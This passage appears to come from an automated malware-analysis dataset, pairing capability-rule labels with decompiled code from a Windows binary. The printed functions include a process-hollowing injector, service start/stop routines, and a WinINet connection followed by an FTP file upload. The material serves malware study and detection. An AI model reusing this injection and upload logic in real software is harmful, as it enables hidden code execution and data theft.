            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046cfd4(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    uchar *in_EDX;\n    \n    fcn.0046cf6c();\n    *(in_EAX + 0x16b0) = 8;\n    if (arg_8h != 0) {\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = in_ECX;\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = in_ECX >> 8;\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = ~in_ECX;\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = ~in_ECX >> 8;\n    }\n    while (in_ECX != 0) {\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *in_EDX;\n        in_EDX = in_EDX + 1;\n        in_ECX = in_ECX + -1;\n    }\n    return;\n}\n",
        "token_count": 438
    },
    "0046dc70": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046dc70(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint lpServiceStatus;\n    int32_t hSCManager;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = 0x46dc85;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack52 = 0x46dc8d;\n    fcn.004059cc();\n    uStack56 = 0x46dd2b;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    uStack64 = 0xf003f;\n    uStack68 = 0;\n    uStack72 = 0x46dcaa;\n    puStack52 = &stack0xfffffffc;\n    uStack72 = fcn.004059dc();\n    puStack76 = 0x46dcb0;\n    hSCManager = sub.advapi32.dll_OpenSCManagerA();\n    if (hSCManager != 0) {\n        uStack80 = 0x46dd09;\n        uStack84 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffac;\n        puStack76 = &stack0xfffffffc;\n        uVar1 = fcn.004059dc(0xf01ff);\n        uVar1 = sub.advapi32.dll_OpenServiceA(hSCManager, uVar1);\n        sub.advapi32.dll_ControlService(uVar1, 1, &fcn.0046dc70::lpServiceStatus);\n        sub.advapi32.dll_CloseServiceHandle();\n        *in_FS_OFFSET = uVar1;\n        sub.advapi32.dll_CloseServiceHandle(hSCManager, 0x46dd10);\n        return;\n    }\n    *in_FS_OFFSET = uStack72;\n    uStack64 = 0x46dd32;\n    uStack68 = 0x46dd2a;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 502
    },
    "0046dd38": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046dd38(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    int32_t hSCManager;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x46dd4d;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack28 = 0x46dd55;\n    fcn.004059cc();\n    uStack32 = 0x46ddf8;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack40 = 0xf003f;\n    uStack44 = 0;\n    uStack48 = 0x46dd72;\n    puStack28 = &stack0xfffffffc;\n    uStack48 = fcn.004059dc();\n    puStack52 = 0x46dd78;\n    hSCManager = sub.advapi32.dll_OpenSCManagerA();\n    if (hSCManager != 0) {\n        uStack56 = 0x46ddd6;\n        uStack60 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc4;\n        puStack52 = &stack0xfffffffc;\n        uVar1 = fcn.004059dc(0xf01ff);\n        uVar1 = sub.advapi32.dll_OpenServiceA(hSCManager, uVar1);\n        var_10h = 0;\n        sub.advapi32.dll_StartServiceA(uVar1, 0, &fcn.0046dd38::var_10h);\n        sub.advapi32.dll_CloseServiceHandle();\n        *in_FS_OFFSET = uVar1;\n        sub.advapi32.dll_CloseServiceHandle(hSCManager, 0x46dddd);\n        return;\n    }\n    *in_FS_OFFSET = uStack48;\n    uStack40 = 0x46ddff;\n    uStack44 = 0x46ddf7;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 510
    },
    "0046e5b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0046e5b0(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    uint uStack444;\n    uchar *puStack440;\n    uint uStack436;\n    uint uStack432;\n    uint uStack428;\n    uchar *puStack424;\n    uint uStack420;\n    uint uStack416;\n    uint32_t uStack140;\n    int32_t iStack136;\n    uchar auStack116 [40];\n    uint8_t uStack76;\n    int32_t iStack72;\n    uchar *puStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    uint32_t uStack56;\n    \n    uVar2 = 0;\n    uStack416 = 0;\n    uStack420 = 0x2c;\n    puStack424 = &stack0xffffffbc;\n    uStack428 = 0;\n    uStack432 = 0x46e5cc;\n    iVar1 = sub.ntdll.dll_NtQuerySystemInformation();\n    if (iVar1 == 0) {\n        uStack432 = 0;\n        uStack436 = 0x20;\n        puStack440 = &stack0xffffff8c;\n        puVar4 = &stack0xfffffe44;\n        uStack444 = 3;\n        iVar1 = sub.ntdll.dll_NtQuerySystemInformation();\n        if (iVar1 == 0) {\n            uVar3 = 2;\n            iVar1 = sub.ntdll.dll_NtQuerySystemInformation(2, &stack0xfffffe44, 0x138, 0);\n            if (iVar1 == 0) {\n                if (*0x494218 != NULL || *0x494214 != 0) {\n                    iStack72 = uVar3 - *0x494214;\n                    puStack68 = puVar4 + (-(uVar3 < *0x494214) - *0x494218);\n                    iStack64 = uStack140 - *0x49421c;\n                    iStack60 = (iStack136 - *0x494220) - (uStack140 < *0x49421c);\n                    uStack56 = uStack76;\n                    *0x494224 = fcn.0040345c();\n                    if (*0x494218 != NULL || *0x494224 != *0x494214) {\n                        uVar2 = *0x494224;\n                    }\n                }\n                *0x494218 = puVar4;\n                *0x494214 = uVar3;\n                *0x49421c = uStack140;\n                *0x494220 = iStack136;\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 602
    },
    "00470b94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00470b94(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffffeb8;\n    uint uVar5;\n    int32_t iStack304;\n    uint uStack300;\n    uchar *puStack296;\n    uint var_114h;\n    uint lpszFile;\n    uint hDrop;\n    uint hMem;\n    \n    puStack296 = &stack0xfffffffc;\n    uStack300 = 0x470c74;\n    iStack304 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack304;\n    fcn.00405530();\n    fcn.00431a7c();\n    iVar1 = fcn.00431970();\n    if (iVar1 != 0) {\n        uVar2 = sub.kernel32.dll_GlobalLock(iVar1);\n        uVar5 = uVar2;\n        iVar3 = sub.shell32.dll_DragQueryFileA(uVar2, 0xffffffff, 0, 0);\n        if (-1 < iVar3 + -1) {\n            do {\n                uVar5 = uVar2;\n                sub.shell32.dll_DragQueryFileA();\n                iVar4 = fcn.0040a868();\n                if (iVar4 != 0) {\n                    fcn.00405728(*in_EAX);\n                    uVar5 = 0x470c8c;\n                    fcn.004058e0();\n                }\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        sub.kernel32.dll_GlobalUnlock(iVar1, uVar5);\n        in_stack_fffffeb8 = iVar1;\n    }\n    *in_FS_OFFSET = in_stack_fffffeb8;\n    fcn.00405530(0x470c7b);\n    return;\n}\n",
        "token_count": 426
    },
    "00471640": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00471640(void)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    char **ppcVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    bool bVar5;\n    uint uStackY18476;\n    uint uStackY18472;\n    uchar *puStackY18468;\n    uint *puStackY18464;\n    uint *puStackY18460;\n    char *apcStackY18456 [3048];\n    uint uStackY6264;\n    uint uStackY6256;\n    uint uStackY6252;\n    uchar *puStackY6248;\n    uint uStackY6244;\n    uint *puStackY6240;\n    uint *puStackY6236;\n    uint *puStackY6232;\n    int32_t iStackY6228;\n    uint uStackY6224;\n    uchar *arg_8h;\n    int32_t iStack6216;\n    uint uStack6212;\n    uchar *puStack6208;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t hSCManager;\n    int32_t *var_4h;\n    \n    puStack6208 = &stack0xfffffffc;\n    piVar1 = 0x4;\n    do {\n        piVar2 = piVar1;\n        piVar1 = piVar2 + -1;\n    } while (piVar2 + -1 != NULL);\n    uStackY18476 = 0;\n    puStackY18468 = NULL;\n    uStackY18472 = 0;\n    puStackY18464 = NULL;\n    puStackY18460 = NULL;\n    uStack6212 = 0x471828;\n    iStack6216 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffe7b8;\n    var_4h = piVar2;\n    fcn.00405530();\n    uStackY6224 = 0;\n    iStackY6228 = 0;\n    puStackY6232 = 0x4716a7;\n    hSCManager = sub.advapi32.dll_OpenSCManagerA();\n    if (hSCManager != 0) {\n        var_14h = 0;\n        do {\n            puStackY6232 = &fcn.00471640::var_14h;\n            puStackY6236 = &fcn.00471640::var_10h;\n            puStackY6240 = &fcn.00471640::var_ch;\n            uStackY6244 = 0x4800;\n            puStackY6248 = &stack0xffffb7e8;\n            uStackY6252 = 3;\n            uStackY6256 = 0x13f;\n            iStackY6228 = hSCManager;\n            uStackY6264 = 0x4716e1;\n            sub.advapi32.dll_EnumServicesStatusA();\n            if (-1 < var_10h + -1) {\n                ppcVar3 = &stack0xffffb7e8;\n                iVar4 = var_10h;\n                do {\n                    bVar5 = *ppcVar3 == NULL;\n                    if (!bVar5) {\n                        bVar5 = **ppcVar3 == '\\0';\n                    }\n                    if (bVar5) {\n                        puStackY6232 = 0x47170b;\n                        fcn.00405818();\n                    }\n                    else {\n                        puStackY6232 = *piVar2;\n                        puStackY6236 = 0x47171c;\n                        fcn.00405728();\n                        puStackY6236 = puStackY18460;\n                        puStackY6240 = 0x471840;\n                        uStackY6244 = 0x471733;\n                        fcn.004058e0();\n                    }\n                    bVar5 = ppcVar3[1] == NULL;\n                    if (!bVar5) {\n                        bVar5 = *ppcVar3[1] == '\\0';\n                    }\n                    if (bVar5) {\n                        puStackY6232 = 0x47174b;\n                        fcn.00405818();\n                    }\n                    else {\n                        puStackY6232 = *piVar2;\n                        puStackY6236 = 0x47175d;\n                        fcn.00405728();\n                        puStackY6236 = puStackY18464;\n                        puStackY6240 = 0x471840;\n                        uStackY6244 = 0x471774;\n                        fcn.004058e0();\n                    }\n                    puStack6208 = 0x471783;\n                    fcn.00405728();\n                    puStack6208 = 0x471794;\n                    fcn.004712a4();\n                    puStack6208 = puStackY18468;\n                    uStack6212 = 0x471840;\n                    iStack6216 = 0x4717ab;\n                    fcn.004058e0();\n                    iStack6216 = *piVar2;\n                    arg_8h = &stack0xffffb7d4;\n                    uStackY6224 = 0x4717c1;\n                    fcn.00405728();\n                    uStackY6224 = 0x4717d0;\n                    fcn.004714b8(arg_8h);\n                    uStackY6224 = uStackY18476;\n                    iStackY6228 = 0x47184c;\n                    puStackY6232 = 0x4717e7;\n                    fcn.004058e0();\n                    ppcVar3 = ppcVar3 + 9;\n                    iVar4 = iVar4 + -1;\n                } while (iVar4 != 0);\n            }\n        } while (var_ch != 0);\n        if (hSCManager != 0) {\n            iStackY6228 = hSCManager;\n            puStackY6236 = 0x47180a;\n            sub.advapi32.dll_CloseServiceHandle();\n        }\n    }\n    *in_FS_OFFSET = iStackY6228;\n    uStackY6224 = 0x471827;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1361
    },
    "004729dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004729dc(uint param_1, char param_2)\n\n{\n    char cVar1;\n    uint32_t arg_ch;\n    uint32_t uVar2;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack560;\n    uint32_t uStack556;\n    uchar *puStack552;\n    uint32_t uStack532;\n    uint uStack528;\n    uchar *puStack524;\n    uint32_t uStack520;\n    uint uStack516;\n    uchar *puStack512;\n    uint var_1ech;\n    uint var_1e8h;\n    uint var_1e4h;\n    uint var_1e0h;\n    uint var_1dch;\n    char var_dh;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack524 = &stack0xfffffffc;\n    var_1e8h = 0;\n    var_1e4h = 0;\n    var_1e0h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    puStack512 = 0x472a16;\n    var_dh = param_2;\n    fcn.004059cc();\n    uStack516 = 0x472c12;\n    uStack520 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdf8;\n    uStack528 = 0x472bd6;\n    uStack532 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdec;\n    puStack512 = &stack0xfffffffc;\n    fcn.00405530();\n    fcn.004719c8();\n    fcn.00405818();\n    fcn.00403770();\n    fcn.0040ef44(&fcn.004729dc::var_1e4h, *0x472c3c);\n    fcn.004055c8();\n    arg_ch = *0x472c3c;\n    puStack552 = 0x472ab6;\n    fcn.0040ef44(&fcn.004729dc::var_1e8h, arg_ch);\n    puStack552 = 0x472ac4;\n    fcn.004055c8();\n    uStack556 = 0x472b0d;\n    uStack560 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdd0;\n    puStack552 = &stack0xfffffffc;\n    fcn.004719c8(0x80);\n    fcn.00405818();\n    uVar2 = fcn.004059dc();\n    sub.kernel32.dll_SetFileAttributesA();\n    *in_FS_OFFSET = uVar2;\n    if (var_dh != '\\0') {\n        uStack560 = 0x472b28;\n        fcn.004034f4();\n        uStack560 = 0x472b2d;\n        fcn.0040305c();\n        while( true ) {\n            uStack560 = 0x472b70;\n            fcn.00403abc();\n            uStack560 = 0x472b75;\n            cVar1 = fcn.0040305c();\n            if (cVar1 != '\\0') break;\n            uStack560 = 0x472b3d;\n            fcn.00403cc4();\n            uStack560 = 0x472b48;\n            fcn.00403d30();\n            uStack560 = 0x472b4d;\n            fcn.0040305c();\n            uStack560 = var_8h;\n            uStack556 = 0x472c48;\n            fcn.004058e0(uVar2, var_ch);\n        }\n        uStack560 = 0x472b84;\n        fcn.00403918();\n        uStack560 = 0x472b89;\n        fcn.0040305c();\n    }\n    uStack560 = 0x472b94;\n    fcn.00405818();\n    uStack560 = 0x472b9f;\n    fcn.00403500();\n    uStack560 = 0x472ba4;\n    fcn.0040305c();\n    uStack560 = 0x472bb2;\n    fcn.00405cd0();\n    uStack560 = 0x472bb7;\n    fcn.004040ac();\n    uStack560 = 0x472bbc;\n    fcn.0040305c();\n    uStack560 = 0x472bc7;\n    fcn.00403918();\n    uStack560 = 0x472bcc;\n    fcn.0040305c();\n    *in_FS_OFFSET = uStack556;\n    *in_FS_OFFSET = arg_ch;\n    fcn.00405554();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1063
    },
    "00472c70": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00472c70(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStackY528;\n    uint uStack520;\n    uint uStack516;\n    uchar *puStack512;\n    uint uStack508;\n    uint uStack504;\n    uchar *puStack500;\n    uint var_1e0h;\n    uint var_1dch;\n    uint var_1d8h;\n    uint var_1d4h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack500 = &stack0xfffffffc;\n    puStack512 = &stack0xfffffffc;\n    uStack504 = 0x472de7;\n    uStack508 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe04;\n    uStack516 = 0x472dab;\n    uStack520 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdf8;\n    fcn.00405530();\n    fcn.004719c8();\n    fcn.00405818();\n    fcn.00403770();\n    fcn.004719c8(0x80);\n    fcn.00405818();\n    uStackY528 = fcn.004059dc();\n    sub.kernel32.dll_SetFileAttributesA();\n    fcn.004034f4();\n    fcn.0040305c();\n    while( true ) {\n        fcn.00403abc();\n        cVar1 = fcn.0040305c();\n        if (cVar1 != '\\0') break;\n        fcn.00403cc4();\n        fcn.00403d30();\n        fcn.0040305c();\n        uStackY528 = 0x472e1c;\n        fcn.004058e0();\n    }\n    fcn.00403918();\n    fcn.0040305c();\n    fcn.00409b7c();\n    fcn.004055c8();\n    fcn.00405584();\n    *in_FS_OFFSET = uStackY528;\n    *in_FS_OFFSET = uStack516;\n    uStack508 = 0x472dee;\n    puStack512 = 0x472dd9;\n    fcn.00405554();\n    puStack512 = 0x472de6;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 518
    },
    "00473448": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00473448(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffac;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x473460;\n    fcn.004059cc();\n    puStack24 = 0x473468;\n    fcn.004059cc();\n    puStack24 = 0x473470;\n    fcn.004059cc();\n    puStack24 = 0x473478;\n    fcn.004059cc();\n    uStack28 = 0x473525;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    *0x49a18c = sub.wininet.dll_InternetOpenA(0x473538, 0, 0, 0, 0);\n    if (*0x49a18c != 0) {\n        uVar1 = fcn.004059dc(1, 0x8000000, 0);\n        uVar1 = fcn.004059dc(uVar1);\n        uVar1 = fcn.00409edc(uVar1);\n        uVar1 = fcn.004059dc(uVar1);\n        in_stack_ffffffac = *0x49a18c;\n        *0x49a188 = sub.wininet.dll_InternetConnectA(*0x49a18c, uVar1);\n        if (*0x49a188 != 0) {\n            *0x49422c = 1;\n            goto code_r0x00473502;\n        }\n    }\n    *0x49422c = 0;\ncode_r0x00473502:\n    *in_FS_OFFSET = in_stack_ffffffac;\n    fcn.00405554(0x47352c);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 461
    },
    "00473540": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00473540(void)\n\n{\n    if (*0x49422c != '\\0') {\n        sub.wininet.dll_InternetCloseHandle(*0x49a18c);\n        sub.wininet.dll_InternetCloseHandle(*0x49a188);\n    }\n    return;\n}\n",
        "token_count": 63
    },
    "00473560": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00473560(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd0;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x473575;\n    fcn.004059cc();\n    puStack20 = 0x47357d;\n    fcn.004059cc();\n    uStack24 = 0x4735d8;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    if (*0x49422c != '\\0') {\n        puStack20 = &stack0xfffffffc;\n        uVar1 = fcn.004059dc(2, 0);\n        uVar1 = fcn.004059dc(uVar1);\n        in_stack_ffffffd0 = *0x49a188;\n        sub.wininet.dll_FtpPutFileA(*0x49a188, uVar1);\n    }\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    fcn.00405554(0x4735df);\n    return;\n}\n",
        "token_count": 278
    },
    "00473dbc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00473dbc(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    \n    if (*(arg_ch + 0xa4) != 0) {\n        for (var_ch = *(arg_ch + 0xa0) + arg_8h; *var_ch != 0; var_ch = var_ch[1] + var_ch) {\n            iVar1 = *var_ch;\n            piVar4 = var_ch + 2;\n            iVar2 = fcn.0040345c();\n            do {\n                if (*piVar4 >> 0xc == 3) {\n                    piVar3 = iVar1 + arg_8h + (*piVar4 & 0xfff);\n                    *piVar3 = *piVar3 + arg_10h;\n                }\n                piVar4 = piVar4 + 2;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 302
    },
    "00473f00": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00473f00(void)\n\n{\n    uint32_t *in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = sub.kernel32.dll_VirtualAlloc_1(0, 0xd0, 0x1000, 4);\n    *in_EAX = uVar1;\n    uVar1 = *in_EAX;\n    if (*in_EAX != 0) {\n        for (; (uVar1 & 3) != 0; uVar1 = uVar1 + 1) {\n        }\n    }\n    return;\n}\n",
        "token_count": 127
    },
    "00473f34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00473f34(int16_t *param_1, uchar *param_2)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *arg_ch;\n    int32_t *in_FS_OFFSET;\n    uint *puVar3;\n    uchar *in_stack_ffffff60;\n    int32_t iStack144;\n    uint *puStack140;\n    uchar *puStack136;\n    uint *var_74h;\n    uchar *puStack116;\n    int32_t iStack112;\n    uint uStack108;\n    int32_t iStack104;\n    uint *puStack100;\n    uchar *hProcess;\n    int32_t hThread;\n    uint lpNumberOfBytesWritten;\n    int32_t lpBaseAddress;\n    int32_t lpBuffer;\n    uchar *lpAddress;\n    uint *lpContext;\n    int32_t var_ch;\n    uchar *var_8h;\n    uint var_4h;\n    \n    puStack136 = 0x473f4d;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.004059cc();\n    puStack136 = 0x473f55;\n    fcn.004059cc();\n    puStack140 = 0x47419c;\n    iStack144 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff70;\n    puStack136 = &stack0xfffffffc;\n    if (var_8h != NULL) {\n        in_stack_ffffff60 = var_8h;\n        puStack136 = &stack0xfffffffc;\n        fcn.004058e0(var_8h, 0x4741c4, var_4h, 0x4741b8);\n    }\n    var_ch = 0;\n    if ((*param_1 == 0x5a4d) && (arg_ch = param_1 + *(param_1 + 0x1e),  *arg_ch == 0x4550)) {\n        fcn.00403af4();\n        fcn.00403af4();\n        var_74h = 0x44;\n        puVar3 = &fcn.00473f34::var_74h;\n        uVar1 = fcn.004059dc(0, 0, 0, 4, 0, 0, puVar3, &fcn.00473f34::hProcess);\n        uVar1 = fcn.004059dc(uVar1);\n        iVar2 = sub.kernel32.dll_CreateProcessA(uVar1);\n        if (iVar2 != 0) {\n            lpContext = fcn.00473f00();\n            if (lpContext != NULL) {\n                *lpContext = 0x10007;\n                iVar2 = sub.kernel32.dll_GetThreadContext(hThread, lpContext);\n                if (iVar2 != 0) {\n                    sub.kernel32.dll_ReadProcessMemory\n                              (hProcess, lpContext[0x29] + 8, &fcn.00473f34::lpBuffer, 4, \n                               &fcn.00473f34::lpNumberOfBytesWritten);\n                    if (arg_ch[0xd] == lpBuffer) {\n                        iVar2 = sub.ntdll_NtUnmapViewOfSection(hProcess, arg_ch[0xd]);\n                        if (iVar2 == 0) {\n                            lpBaseAddress =\n                                 sub.kernel32.dll_VirtualAllocEx(hProcess, arg_ch[0xd], arg_ch[0x14], 0x3000, 0x40);\n                        }\n                        else {\n                            lpBaseAddress = sub.kernel32.dll_VirtualAllocEx(hProcess, 0, arg_ch[0x14], 0x3000, 0x40);\n                        }\n                    }\n                    else {\n                        lpBaseAddress =\n                             sub.kernel32.dll_VirtualAllocEx(hProcess, arg_ch[0xd], arg_ch[0x14], 0x3000, 0x40);\n                    }\n                    if (lpBaseAddress != 0) {\n                        uStack108 = fcn.00473e74();\n                        if (arg_ch[0xd] != lpBaseAddress) {\n                            fcn.00473dbc(uStack108, arg_ch, lpBaseAddress - arg_ch[0xd]);\n                            arg_ch[0xd] = lpBaseAddress;\n                            fcn.00408560();\n                        }\n                        puStack100 = &fcn.00473f34::lpNumberOfBytesWritten;\n                        iStack104 = arg_ch[0x14];\n                        iStack112 = lpBaseAddress;\n                        puStack116 = hProcess;\n                        var_74h = 0x474115;\n                        sub.kernel32.dll_WriteProcessMemory();\n                        var_74h = &fcn.00473f34::lpNumberOfBytesWritten;\n                        puStack136 = hProcess;\n                        puStack140 = 0x474135;\n                        sub.kernel32.dll_WriteProcessMemory();\n                        lpContext[0x2c] = arg_ch[10] + lpBaseAddress;\n                        puStack140 = lpContext;\n                        iStack144 = hThread;\n                        sub.kernel32.dll_SetThreadContext();\n                        sub.kernel32.dll_ResumeThread(hThread);\n                        var_ch = hThread;\n                    }\n                }\n                sub.kernel32.dll_VirtualFree_1(lpAddress, 0, 0x8000);\n                in_stack_ffffff60 = lpAddress;\n            }\n            if (var_ch == 0) {\n                sub.kernel32.dll_TerminateProcess(puVar3, 0);\n                in_stack_ffffff60 = hProcess;\n            }\n        }\n    }\n    *in_FS_OFFSET = in_stack_ffffff60;\n    fcn.00405554(0x4741a3);\n    return;\n}\n",
        "token_count": 1243
    },
    "00474208": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
